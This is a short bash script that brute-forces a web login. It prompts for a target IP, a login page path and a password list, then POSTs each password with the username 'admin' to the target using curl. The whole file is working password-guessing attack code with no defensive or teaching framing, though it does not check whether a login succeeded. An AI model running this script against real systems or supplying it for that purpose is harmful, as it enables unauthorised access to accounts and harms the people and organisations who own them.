#!/bin/bash

# Read inputs from the user
read -p "What is the TGT IP? (EX: 192.168.0.2): " tgtip
read -p "What is the LOGIN page? (EX: portal/login.php): " login_page
read -p "Where is the PASSWORDS list? (EX: passwords.txt): " passes

# Loop through each password in the list
while IFS= read -r password
do
    # Perform the login attempt using curl
    curl -X POST --data "username=admin&password=$password" "http://$tgtip/$login_page"
done < "$passes"
